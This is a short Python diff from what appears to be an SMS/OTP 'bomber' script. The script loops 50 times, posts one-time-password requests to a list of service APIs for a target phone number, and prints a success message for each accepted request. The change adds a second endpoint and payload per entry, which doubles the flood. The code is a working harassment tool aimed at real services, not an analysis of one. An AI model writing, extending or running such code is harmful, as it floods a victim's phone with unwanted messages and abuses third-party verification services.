@@ -14,13 +14,15 @@ try:
 
     # Loop to send OTPs 50 times
     for _ in range(50):
-        for url, payload in apis:
+        for url, payload, url2, payload2 in apis:
             try:
+                response2 = requests.post(url2, json=payload2)
                 response = requests.post(url, data=payload)
                 
                 if response.status_code == 200:
                     print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url +')' +  '.' )
-                    
+                if response2.status_code == 200:
+                    print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url2 +')' +  '.' )
                 
             except requests.exceptions.RequestException:
                 pass
